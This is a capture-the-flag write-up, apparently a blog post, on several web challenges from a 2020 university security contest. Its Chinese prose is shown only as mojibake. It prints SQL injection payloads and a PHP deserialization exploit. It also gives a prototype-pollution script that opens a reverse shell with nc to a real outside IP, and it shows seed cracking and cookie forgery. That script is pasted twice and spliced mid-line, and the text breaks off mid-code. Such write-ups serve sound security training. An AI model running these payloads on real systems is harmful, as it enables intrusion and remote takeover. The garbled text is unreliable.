<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200310082541235.png" alt="image-20200310082541235"></p>
<p>å¯ä»¥è¿™æ ·ï¼Œé‚£ä¹ˆå°±ç›´æ¥è”åˆæŸ¥è¯¢æ³¨å…¥äº†ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?time&#x3D;202&#39;%20\u\n\i\o\n%20\s\e\l\e\c\t%201,\g\r\o\u\p\_\c\o\n\c\a\t(\t\a\b\l\e\_\n\a\m\e),3\%20\f\r\o\m%20\i\n\f\o\r\m\a\t\i\o\n_\s\c\h\e\m\a.\t\a\b\l\e\s%20\w\h\e\r\e\%20\t\a\b\l\e\_\s\c\h\e\m\a\&#x3D;\d\a\t\a\b\a\s\e()%23 HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309201606004.png" alt="image-20200309201606004"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?time&#x3D;202&#39;%20\u\n\i\o\n%20\s\e\l\e\c\t%201,\g\r\o\u\p\_\c\o\n\c\a\t(\c\o\l\u\m\n_\n\a\m\e),3\%20\f\r\o\m%20\i\n\f\o\r\m\a\t\i\o\n_\s\c\h\e\m\a.\c\o\l\u\m\n\s%20\w\h\e\r\e\%20\t\a\b\l\e\_\s\c\h\e\m\a\&#x3D;\d\a\t\a\b\a\s\e()%23</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309201834389.png" alt="image-20200309201834389"></p>
<p>åˆ—åï¼šid,username,passwd,url,id,content,createtime</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309201948631.png" alt="image-20200309201948631"></p>
<p>å­—æ®µå€¼ ï¼šusername  admin passwd 20200202goodluck  url   /eGlhb2xldW5n </p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309202335757.png" alt="image-20200309202335757"></p>
<p>ç„¶åè·³åˆ° <a href="http://121.37.181.246:6333/eGlhb2xldW5n/check.php" target="_blank" rel="noopener">http://121.37.181.246:6333/eGlhb2xldW5n/check.php</a></p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309202419211.png" alt="image-20200309202419211"></p>
<p>è¿™é‡Œå¯ä»¥æŸ¥è¯¢å†…éƒ¨çš„æ–‡ä»¶ï¼ŒåŠ ä¸Šlocalhostå°±å¯ä»¥ç»•è¿‡ï¼Œ</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309202924096.png" alt="image-20200309202924096"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $gf;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;	</span><br><span class="line">		$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">	&#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		 &#125; </span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">		$str = <span class="string">""</span>;</span><br><span class="line">		 $number = str_split($number,<span class="number">2</span>);</span><br><span class="line">		 <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line">		 	$str = $str .chr($num);</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> strtolower($str);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> chr($number);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">		  	<span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">		  	$content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">		  	<span class="keyword">return</span> $content;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªååºåˆ—åŒ–ï¼Œè§¦å‘<code>__destruct()</code>å‡½æ•°ï¼Œç„¶åè°ƒç”¨<code>content_to_file()</code>å‡½æ•°ï¼Œ$gfé‡Œé¢ä¸èƒ½æœ‰å­—æ¯æ•°å­—å’Œå…¶ä»–ä¸€äº›ç¬¦å·ï¼ŒæŠŠgfèµ‹ç»™contentåï¼Œè°ƒç”¨aiisc_to_chr()å‡½æ•°ï¼Œä»¥ä¸¤ä½ä¸ºå•ä½åˆ†å‰²æˆä¸€ä¸ªæ•°ç»„ï¼Œä¾æ¬¡å–æ•°ç»„ä¸­çš„å†…å®¹æ”¾åˆ°chr()é‡Œé¢ï¼Œä¹‹åè¿›è¡Œæ‹¼æ¥ï¼Œç„¶åå˜æˆå°å†™ï¼Œé€åˆ°<code>content_to_file</code>ä¸­ï¼Œpasså˜é‡é€šè¿‡æ¢è¡Œå°±å¯ä»¥ç»•è¿‡ï¼Œ$gfé€šè¿‡å–åæ¥ç»•è¿‡ï¼Œåé¢æœ‰å˜å°å†™çš„æ“ä½œï¼Œé‚£ä¹ˆä¼ è¿‡å»FLAGå°±å¯ä»¥äº†ï¼ŒæŠŠFLAGæŒ‰chrï¼ˆï¼‰é€†è¿‡æ¥å°±æ˜¯</p>
<img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200310135900470.png" alt="image-20200310135900470" style="zoom:200%;">

<p>70766571ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦è®©contentç­‰äºè¿™ä¸ªï¼Œä½†åˆè¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ï¼Œå¯ä»¥è¿™æ ·</p>
<img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200310140052720.png" alt="image-20200310140052720" style="zoom:200%;">

<p>ç„¶å</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span> </span>&#123;    </span><br><span class="line"><span class="comment">// $gf = "70766571";    </span></span><br><span class="line"><span class="keyword">public</span> $gf = <span class="string">"~\C8\xCF\xC8\xC9\xC9\xCA\xC8\xCE"</span>; </span><br><span class="line">&#125;</span><br><span class="line">$trick = <span class="keyword">new</span> trick(); </span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($trick));</span><br></pre></td></tr></table></figure>

<img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309210747399.png" alt="image-20200309210747399" style="zoom:150%;">



<h1 id="guess-game"><a href="#guess-game" class="headerlink" title="guess game"></a>guess game</h1><p>çœ‹åˆ°logå‡½æ•°é‡Œé¢æœ‰mergeï¼Œé‚£ä¹ˆå¯ä»¥åŸå‹é“¾æ±¡æŸ“äº†</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">userInfo</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> logItem = &#123;<span class="string">"time"</span>:<span class="keyword">new</span> <span class="built_in">Date</span>().toString()&#125;;</span><br><span class="line">    merge(logItem,userInfo);</span><br><span class="line">    loginHistory.push(logItem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åpost/è·¯ç”±ä¸­è°ƒç”¨äº†log</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//So terrible code~</span></span><br><span class="line">app.post(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> req.body.user.username != <span class="string">"string"</span>)&#123;</span><br><span class="line">        res.end(<span class="string">"error"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//console.log(req.body.user.username);</span></span><br><span class="line">        <span class="keyword">if</span>(config.forbidAdmin &amp;&amp; req.body.user.username.includes(<span class="string">"admin"</span>))&#123;</span><br><span class="line">            res.end(<span class="string">"any admin user has been baned"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(req.body.user.username.toUpperCase() === adminName.toUpperCase())</span><br><span class="line">                <span class="comment">//only log admin's activity</span></span><br><span class="line">                log(req.body.user);</span><br><span class="line">            res.end(<span class="string">"ok"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ»¡è¶³è¾“å…¥çš„usernameçš„å¤§å†™è¦ç­‰äº â€œadmin888â€çš„å¤§å†™ï¼Œåˆ©ç”¨javascriptçš„å¤§å°å†™ç‰¹æ€§ï¼Œå°±å¯ä»¥ç»•è¿‡ï¼Œç„¶åè¯•äº†è¯•ä¹‹å‰ejsæ¨¡æ¿çš„åå¼¹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://121.37.167.12"</span></span><br><span class="line">proxy=&#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line">r=requests.post(url,json=&#123;<span class="string">"user"</span>:&#123;<span class="string">"username"</span>:<span class="string">"admIn888"</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"enableReg"</span>:<span class="literal">True</span>,<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 144.34.200.151 9999 &gt;/tmp/f ');var __tmp2"</span>&#125;&#125;&#125;,proxies=proxy)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br><span class="line">r=requests.get(url,proxies=proxy)</span><br><span class="line"><span class="keyword">print</span> r.textimport requests</span><br><span class="line">url=<span class="string">"http://121.37.167.12"</span></span><br><span class="line">proxy=&#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line">r=requests.post(url,json=&#123;<span class="string">"user"</span>:&#123;<span class="string">"username"</span>:<span class="string">"admIn888"</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"enableReg"</span>:<span class="literal">True</span>,<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 144.34.200.151 9999 &gt;/tmp/f ');var __tmp2"</span>&#125;&#125;&#125;,proxies=proxy)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<p>ç«Ÿç„¶å¯ä»¥</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309222006644.png" alt="image-20200309222006644"></p>
<h1 id="happy-vacation"><a href="#happy-vacation" class="headerlink" title="happy vacation"></a>happy vacation</h1><p>åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼ŒæŠŠä»–çš„æ³¨é‡Šå»æ‰ï¼Œæç¤ºè¯´é‡ç‚¹åœ¨é€‰æ‹©é‚£é‡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Asker</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> $question;</span><br><span class="line">	<span class="keyword">public</span> $right;</span><br><span class="line">	<span class="keyword">public</span> $answer;</span><br><span class="line">	<span class="keyword">public</span> $times = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">public</span> $A = <span class="keyword">True</span>;</span><br><span class="line">	<span class="keyword">public</span> $B = <span class="keyword">True</span>;</span><br><span class="line">	<span class="keyword">public</span> $C = <span class="keyword">True</span>;</span><br><span class="line">	<span class="keyword">public</span> $D = <span class="keyword">True</span>;</span><br><span class="line">	<span class="keyword">public</span> $message = <span class="string">"å¤§éƒå¿«é†’é†’ï¼Œè€å¸ˆå«ä½ å›ç­”é—®é¢˜å•¦ï¼"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;question = <span class="string">"what is your problem?"</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;right = <span class="string">"A"</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;answer_list = [<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">answerList</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;answer_list;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">mes</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;message;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">updateList</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;answer_list = [];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;A ? array_push(<span class="keyword">$this</span>-&gt;answer_list, <span class="string">"A"</span>) : <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;B ? array_push(<span class="keyword">$this</span>-&gt;answer_list, <span class="string">"B"</span>) : <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;C ? array_push(<span class="keyword">$this</span>-&gt;answer_list, <span class="string">"C"</span>) : <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;D ? array_push(<span class="keyword">$this</span>-&gt;answer_list, <span class="string">"D"</span>) : <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;message = <span class="string">"è¿™éƒ½èƒ½ç­”é”™ï¼Œå†ç»™ä½ ä¸€æ¬¡æœºä¼šï¼"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">answer</span><span class="params">($user, $answer)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;user = <span class="keyword">clone</span> $user;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;right == $answer)&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;message = <span class="string">"clever man!"</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">"/[^a-zA-Z_\-&#125;&gt;@\]*]/i"</span>, $answer))&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;message = <span class="string">"no no no"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(preg_match(<span class="string">'/f|sy|and|or|j|sc|in/i'</span>, $answer))&#123;</span><br><span class="line">					<span class="comment">// Big Tree è¯´è¿™ä¸ªæ­£åˆ™ä¸éœ€è¦ç»•</span></span><br><span class="line">					<span class="keyword">$this</span>-&gt;message = <span class="string">"what are you doing bro?"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">eval</span>(<span class="string">"\$this-&gt;"</span>.$answer.<span class="string">" = false;"</span>);</span><br><span class="line">					<span class="keyword">$this</span>-&gt;updateList();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;times ++;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">times</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;times;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸€ä¸ªevalçš„æ“ä½œ,ç„¶åæµ‹è¯•èƒ½æŠŠblacklistç½®ä¸ºfalse,</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309223348604.png" alt="image-20200309223348604"></p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309223311442.png" alt="image-20200309223311442">ç„¶åå°±ä¼ ä¸ªphpæ–‡ä»¶åˆ°uploadç›®å½•ï¼Œè·¯å¾„ä»uploadå‡½æ•°ä¹Ÿå¯ä»¥çŸ¥é“ï¼Œåº”è¯¥éé¢„æœŸäº†ã€‚</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309223544545.png" alt="image-20200309223544545"></p>
<h1 id="nothardweb"><a href="#nothardweb" class="headerlink" title="nothardweb"></a>nothardweb</h1><p>åˆ©ç”¨ä¹‹å‰çš„mt_rant()å‡½æ•°é—´éš”226ä¸ªéšæœºæ•°çš„ä¸¤ä¸ªæ•°å¯ä»¥å¾—åˆ°seed,</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309233302645.png" alt="image-20200309233302645"></p>
<p>æ¥ä¸‹æ¥å®¡è®¡æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"user.php"</span>;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"conn.php"</span>;</span><br><span class="line">    $IV = <span class="string">"********"</span>;<span class="comment">// you cant know that;</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'key'</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">'key'</span>] = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line">            $_SESSION[<span class="string">'iv'</span>] = $IV;</span><br><span class="line">        &#125;</span><br><span class="line">        $username = <span class="string">"guest"</span>;</span><br><span class="line">        $o = <span class="keyword">new</span> User($username);</span><br><span class="line">        <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">        $ser_user = serialize($o);</span><br><span class="line">        $cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">        setcookie(<span class="string">"user"</span>, base64_encode($cipher), time()+<span class="number">3600</span>);</span><br><span class="line">        setcookie(<span class="string">"hash"</span>, md5($ser_user), time() + <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $user = base64_decode($_COOKIE[<span class="string">'user'</span>]);</span><br><span class="line">        $uid = openssl_decrypt($user, <span class="string">'des-cbc'</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(md5($uid) !== $_COOKIE[<span class="string">'hash'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $o = unserialize($uid);</span><br><span class="line">        <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;username === <span class="string">"admin"</span>)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'name'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">"hint.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    md5(openssl_encrypt(base64_decode($cookie[<span class="string">'user'</span>]),<span class="string">'des-cbc'</span>,sessionkey,<span class="number">0</span>,sessioniv))==cookie[<span class="string">'hash'</span>]</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç¬¬ä¸€æ¬¡åˆ°è¿™ä¸ªé¡µé¢ï¼Œä»–ä¼šç”¨ç¬¬229ä¸ªéšæœºæ•°å’Œ0x5f5e0ffå¼‚æˆ–ï¼Œå¾—åˆ°çš„å€¼ä½œä¸ºkey,ç„¶åé‡‡ç”¨des-cbcçš„åŠ å¯†æ–¹å¼å¯¹åºåˆ—åŒ–åçš„æ•°æ®åŠ å¯†ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¹‹å‰çš„æ–¹å¼å¾—åˆ°key,ç„¶åå°±æ˜¯é€šè¿‡æ‰¾åˆ°IVå»ä¼ªé€ æˆadmin,å…ˆä»‹ç»ä¸‹des-cbcçš„åŠ å¯†æ–¹å¼ï¼Œ</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/20180901170843459.png" alt="img"></p>
<p>æˆ‘ä»¬ç°åœ¨å·²çŸ¥æ˜æ–‡ã€å¯†æ–‡ã€key,ç„¶åå»æ±‚IVï¼Œçœ‹åŠ å¯†çš„å›¾å¯ä»¥çŸ¥é“ï¼Œç¬¬ä¸€å—ä¸­åŠ å¯†çš„å€¼æ˜¯IVå’Œåˆ†ç»„ä¸€çš„å¼‚æˆ–å€¼ï¼Œå¦‚æœæˆ‘ä»¬æŠŠivå’Œåˆ†ç»„ä¸€äº’æ¢çš„è¯ï¼Œæ˜¯ä¸ä¼šå½±å“åé¢çš„å¯†æ–‡çš„ï¼Œé‚£ä¹ˆåœ¨è¿™é“é¢˜é‡Œï¼Œæˆ‘ä»¬é€šè¿‡æŠŠè§£å¯†çš„iv,æ›¿æ¢ä¸ºæˆ‘ä»¬æ˜æ–‡çš„åˆ†ç»„ä¸€ï¼Œé‚£ä¹ˆè§£å¯†å‡ºæ¥çš„æ˜æ–‡çš„ç¬¬ä¸€ä¸ªåˆ†ç»„å°±æ˜¯IVï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">3946604448</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"user.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> mt_rand() . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">2</span>; $i &lt;= <span class="number">226</span>; $i++) &#123;</span><br><span class="line">	mt_rand();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> mt_rand() . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand() . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line"><span class="comment">//$username = "guest";</span></span><br><span class="line"><span class="comment">//$o = new User($username);</span></span><br><span class="line"><span class="comment">//echo $o-&gt;show();</span></span><br><span class="line"><span class="comment">//$ser_user = serialize($o);</span></span><br><span class="line"><span class="comment">//echo $ser_user . "\n";</span></span><br><span class="line"><span class="comment">//O:4:"User":1:&#123;s:</span></span><br><span class="line"><span class="comment">//8:"username";s:5</span></span><br><span class="line"><span class="comment">//:"guest";&#125;</span></span><br><span class="line"><span class="comment">//echo base64_decode("RjVqcnlFR2FEd0JMazFXSDJLZzhHZGw3Q0M2SkRNS2ZOY2FlTWMreDlSdFdoYVJXaXk4UHU4RW9zT3JnV0c5Nw==");</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span 